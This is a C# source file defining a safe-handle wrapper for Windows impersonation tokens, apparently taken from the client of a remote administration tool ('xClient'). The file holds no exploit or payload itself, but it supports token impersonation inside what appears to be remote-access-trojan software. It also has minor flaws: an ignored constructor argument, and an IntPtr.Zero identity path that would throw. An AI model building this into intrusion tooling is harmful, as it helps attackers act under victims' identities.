using System;
using System.Security.Permissions;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;
using xClient.Core.Helper;
namespace xClient.Core.Data
{
    [SecurityPermission(SecurityAction.InheritanceDemand, UnmanagedCode = true)]
    [SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
    public class ImpersonationSafeHandle : SafeHandleZeroOrMinusOneIsInvalid
    {
        //Impersonate Logged On User Returns a True/False
        //LogonUser
        public ImpersonationSafeHandle()
               : base(true)
        {
        }
        public ImpersonationSafeHandle(IntPtr handle, bool ownHandle)
               : base(true)
        {
            this.SetHandle(handle);
        }
        public IntPtr GetHandle()
        {
            return this.handle;
        }

        public WindowsIdentity GetWindowsIdentity()
        {
            if (this.IsClosed)
            {
                return new WindowsIdentity(IntPtr.Zero);
            }
            else if (this.IsInvalid)
            {
                return new WindowsIdentity(IntPtr.Zero);
            }
            return new WindowsIdentity(this.handle);
        }
        protected override bool ReleaseHandle()
        {
                return WindowsAPIHelper.CloseHandle(this.handle) ;
        }
    }
}
